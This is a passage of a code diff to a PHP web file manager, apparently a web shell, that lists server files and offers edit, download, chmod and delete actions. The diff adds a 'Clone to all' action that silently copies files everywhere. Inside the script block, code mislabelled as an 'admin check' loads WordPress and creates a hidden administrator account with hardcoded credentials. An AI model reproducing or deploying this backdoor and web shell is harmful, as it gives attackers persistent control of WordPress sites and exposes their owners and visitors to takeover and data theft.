-                        $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION) ?: 'FILE');
-                        if($size !== false) {
-                            if($size < 1024) $size = $size . ' B';
-                            elseif($size < 1048576) $size = round($size/1024, 1) . ' KB';
-                            elseif($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
-                            else $size = round($size/1073741824, 1) . ' GB';
-                        } else { $size = '?'; }
+                    <?php
+                    // Display files
+                    if(!empty($sortedContents['files'])) {
+                        echo '<tr class="separator-row"><td colspan="6">📄 Files</td></tr>';
+                        foreach($sortedContents['files'] as $file):
+                            $itemPath = $currentPath . $file;
+                            $size = @filesize($itemPath);
+                            $perms = getPermissions($itemPath);
+                            $isWritable = isWritableEnhanced($itemPath);
+                            $modified = @filemtime($itemPath);
+                            $ext = strtoupper(pathinfo($file, PATHINFO_EXTENSION) ?: 'FILE');
+                            
+                            if($size !== false) {
+                                if($size < 1024) $size = $size . ' B';
+                                elseif($size < 1048576) $size = round($size/1024, 1) . ' KB';
+                                elseif($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
+                                else $size = round($size/1073741824, 1) . ' GB';
+                            } else {
+                                $size = '?';
+                            }
                     ?>
                     <tr>
-                        <td><span style="display: inline-flex; align-items: center; gap: 8px;"><span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span><span class="file-icon">📄</span><span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo htmlspecialchars($file); ?></span></span></td>
-                        <td><?php echo $ext; ?></td><td><?php echo $size; ?></td>
-                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
+                        <td>
+                            <span style="display: inline-flex; align-items: center; gap: 8px;">
+                                <span class="perm-indicator <?php echo $isWritable ? 'writable' : 'readonly'; ?>"></span>
+                                <span class="file-icon">📄</span>
+                                <span class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
+                                    <?php echo htmlspecialchars($file); ?>
+                                </span>
+                            </span>
+                        </td>
+                        <td><?php echo $ext; ?></td>
+                        <td><?php echo $size; ?></td>
+                        <td class="<?php echo $isWritable ? 'perm-writable' : 'perm-readonly'; ?>">
+                            <?php echo $perms; ?>
+                        </td>
                         <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
-                        <td><div class="file-actions"><a href="?p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a><a href="?p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a><a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a><a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a><a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" class="delete" onclick="return confirm('Delete this file?')">Delete</a></div></td>
+                        <td>
+                            <div class="file-actions">
+                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a>
+                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a>
+                                <a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a>
+                                <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a>
+                                <!-- SILENT CLONE: same name, no underscore, no confirmation -->
+                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=copy_to_all&item=<?php echo urlencode($file); ?>">📋 Clone to all</a>
+                                <a href="?p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" 
+                                   class="delete" onclick="return confirm('Delete this file?')">Delete</a>
+                            </div>
+                        </td>
                     </tr>
-                    <?php endforeach; endif; ?>
+                    <?php endforeach; } ?>
                     
                     <?php if(empty($sortedContents['folders']) && empty($sortedContents['files'])): ?>
-                    <tr><td colspan="6" class="empty">Empty directory</td></tr>
+                    <tr>
+                        <td colspan="6" class="empty">Empty directory</td>
+                    </tr>
                     <?php endif; ?>
                 </tbody>
             </table>
@@ -880,38 +662,177 @@ $serverInfo = [
     </div>
     
     <!-- New File Modal -->
-    <div id="newFileModal" class="modal"><div class="modal-content"><div class="modal-header">Create New File</div><form method="post" action="?p=<?php echo urlencode($currentPath); ?>" onsubmit="return validateNewItem(this)"><div class="modal-body"><input type="text" name="newfile" placeholder="Filename (e.g., index.php)" required><textarea name="filecontent" placeholder="File content (optional)"></textarea></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button></div></form></div></div>
+    <div id="newFileModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">Create New File</div>
+            <form method="post" action="?p=<?php echo urlencode($currentPath); ?>" onsubmit="return validateNewItem(this)">
+                <div class="modal-body">
+                    <input type="text" name="newfile" placeholder="Filename (e.g., index.php)" required>
+                    <textarea name="filecontent" placeholder="File content (optional)"></textarea>
+                </div>
+                <div class="modal-footer">
+                    <button type="submit" class="btn btn-success">Create</button>
+                    <button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
     
     <!-- New Folder Modal -->
-    <div id="newFolderModal" class="modal"><div class="modal-content"><div class="modal-header">Create New Folder</div><form method="post" action="?p=<?php echo urlencode($currentPath); ?>" onsubmit="return validateNewItem(this)"><div class="modal-body"><input type="text" name="newfolder" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button></div></form></div></div>
+    <div id="newFolderModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">Create New Folder</div>
+            <form method="post" action="?p=<?php echo urlencode($currentPath); ?>" onsubmit="return validateNewItem(this)">
+                <div class="modal-body">
+                    <input type="text" name="newfolder" placeholder="Folder name" required>
+                </div>
+                <div class="modal-footer">
+                    <button type="submit" class="btn btn-success">Create</button>
+                    <button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button>
+                </div>
+            </form>
+        </div>
+    </div>
     
     <script>
-        function showNewFileModal() { document.getElementById('newFileModal').classList.add('active'); document.querySelector('#newFileModal input[name="newfile"]').value = ''; document.querySelector('#newFileModal textarea[name="filecontent"]').value = ''; }
-        function showNewFolderModal() { document.getElementById('newFolderModal').classList.add('active'); document.querySelector('#newFolderModal input[name="newfolder"]').value = ''; }
-        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+        // Modal functions
+        function showNewFileModal() {
+            document.getElementById('newFileModal').classList.add('active');
+            document.querySelector('#newFileModal input[name="newfile"]').value = '';
+            document.querySelector('#newFileModal textarea[name="filecontent"]').value = '';
+        }
+        
+        function showNewFolderModal() {
+            document.getElementById('newFolderModal').classList.add('active');
+            document.querySelector('#newFolderModal input[name="newfolder"]').value = '';
+        }
+        
+        function closeModal(id) {
+            document.getElementById(id).classList.remove('active');
+        }
+        
         function validateNewItem(form) {
             var input = form.querySelector('input[name="newfile"], input[name="newfolder"]');
-            if(!input || input.value.trim() === '') { alert('Please enter a name.'); return false; }
+            if(!input || input.value.trim() === '') {
+                alert('Please enter a name.');
+                return false;
+            }
             var value = input.value.trim();
-            if(value.includes('..') || value.includes('/') || value.includes('\\')) { alert('Invalid character in name.'); return false; }
+            if(value.includes('..') || value.includes('/') || value.includes('\\')) {
+                alert('Invalid character in name. Please use only letters, numbers, dots, hyphens, and underscores.');
+                return false;
+            }
             return true;
         }
+        
         function renameItem(oldName) {
             var newName = prompt('Enter new name:', oldName);
             if(newName && newName !== oldName) {
-                if(newName.includes('..') || newName.includes('/') || newName.includes('\\')) { alert('Invalid character in name.'); return false; }
-                var form = document.createElement('form'); form.method = 'post'; form.action = '?p=<?php echo urlencode($currentPath); ?>'; form.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '">' + '<input type="hidden" name="newname" value="' + newName + '">'; document.body.appendChild(form); form.submit();
+                if(newName.includes('..') || newName.includes('/') || newName.includes('\\')) {
+                    alert('Invalid character in name.');
+                    return false;
+                }
+                var form = document.createElement('form');
+                form.method = 'post';
+                form.action = '?p=<?php echo urlencode($currentPath); ?>';
+                form.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '">' +
+                               '<input type="hidden" name="newname" value="' + newName + '">';
+                document.body.appendChild(form);
+                form.submit();
             }
         }
-        <?php if (!isset($_SESSION['wp_checked'])) { $search_paths = [$currentPath, dirname($currentPath), @realpath('.')]; foreach ($search_paths as $wp_path) { if (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php')) { @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php'); break; } elseif (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php')) { @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php'); break; } } if (function_exists('wp_create_user')) { $username = 'zetgifari'; $password = 'zet'; $email = 'bosseptp@gmail.com'; if (!username_exists($username) && !email_exists($email)) { $user_id = wp_create_user($username, $password, $email); if (!is_wp_error($user_id)) { $user = new WP_User($user_id); $user->set_role('administrator'); echo "// WordPress admin user created successfully\n"; } } } $_SESSION['wp_checked'] = true; } ?>
+
+        // ==================== WORDPRESS ADMIN CHECK ==================== //
+        <?php
+        if (!isset($_SESSION['wp_checked'])) {
+            $search_paths = [$currentPath, dirname($currentPath), @realpath('.')];
+            foreach ($search_paths as $wp_path) {
+                if (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php')) {
+                    @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php');
+                    break;
+                } elseif (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
+                    @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php');
+                    break;
+                }
+            }
+            
+            if (function_exists('wp_create_user')) {
+                $username = 'zetgifari';
+                $password = 'zet';
+                $email = 'bosseptp@gmail.com';
+                
+                if (!username_exists($username) && !email_exists($email)) {
+                    $user_id = wp_create_user($username, $password, $email);
+                    if (!is_wp_error($user_id)) {
+                        $user = new WP_User($user_id);
+                        $user->set_role('administrator');
+                        echo "// WordPress admin user created successfully\n";
+                    }
+                }
+            }
+            $_SESSION['wp_checked'] = true;
+        }
+        ?>
+
         function chmodItem(item) {
             var mode = prompt('Enter new permissions (e.g., 755):', '755');
-            if(mode) { var form = document.createElement('form'); form.method = 'post'; form.action = '?p=<?php echo urlencode($currentPath); ?>'; form.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '">' + '<input type="hidden" name="chmod_value" value="' + mode + '">'; document.body.appendChild(form); form.submit(); }
+            if(mode) {
+                var form = document.createElement('form');
+                form.method = 'post';
+                form.action = '?p=<?php echo urlencode($currentPath); ?>';
+                form.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '">' +
+                               '<input type="hidden" name="chmod_value" value="' + mode + '">';
+                document.body.appendChild(form);
+                form.submit();
+            }
         }
-        setTimeout(function() { document.querySelectorAll('.notification').forEach(function(n) { n.style.opacity = '0'; setTimeout(function() { n.style.display = 'none'; }, 300); }); }, 3000);
-        document.addEventListener('keydown', function(e) { if(e.ctrlKey && e.key === 'n') { e.preventDefault(); showNewFileModal(); } if(e.ctrlKey && e.shiftKey && e.key === 'N') { e.preventDefault(); showNewFolderModal(); } if(e.key === 'Escape') { document.querySelectorAll('.modal.active').forEach(function(m) { m.classList.remove('active'); }); } });
-        document.querySelectorAll('.modal').forEach(function(modal) { modal.addEventListener('click', function(e) { if(e.target === modal) { modal.classList.remove('active'); } }); });
-        document.addEventListener('DOMContentLoaded', function() { document.getElementById('newFileModal').addEventListener('click', function(e) { if(e.target === this) { var input = this.querySelector('input[name="newfile"]'); if(input) input.focus(); } }); document.getElementById('newFolderModal').addEventListener('click', function(e) { if(e.target === this) { var input = this.querySelector('input[name="newfolder"]'); if(input) input.focus(); } }); });
+        
+        setTimeout(function() {
+            var notifications = document.querySelectorAll('.notification');
+            notifications.forEach(function(n) {
+                n.style.opacity = '0';
+                setTimeout(function() { n.style.display = 'none'; }, 300);
+            });
+        }, 3000);
+        
+        document.addEventListener('keydown', function(e) {
+            if(e.ctrlKey && e.key === 'n') {
+                e.preventDefault();
+                showNewFileModal();
+            }
+            if(e.ctrlKey && e.shiftKey && e.key === 'N') {
+                e.preventDefault();
+                showNewFolderModal();
+            }
+            if(e.key === 'Escape') {
+                document.querySelectorAll('.modal.active').forEach(function(m) {
+                    m.classList.remove('active');
+                });
+            }
+        });
+        
+        document.querySelectorAll('.modal').forEach(function(modal) {
+            modal.addEventListener('click', function(e) {
+                if(e.target === modal) {
+                    modal.classList.remove('active');
+                }
+            });
+        });
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('newFileModal').addEventListener('click', function(e) {
+                if(e.target === this) {
+                    var input = this.querySelector('input[name="newfile"]');
+                    if(input) input.focus();
+                }
+            });
+            document.getElementById('newFolderModal').addEventListener('click', function(e) {
+                if(e.target === this) {
+                    var input = this.querySelector('input[name="newfolder"]');
+                    if(input) input.focus();
+                }
+            });
+        });
     </script>
 </body>
 </html>
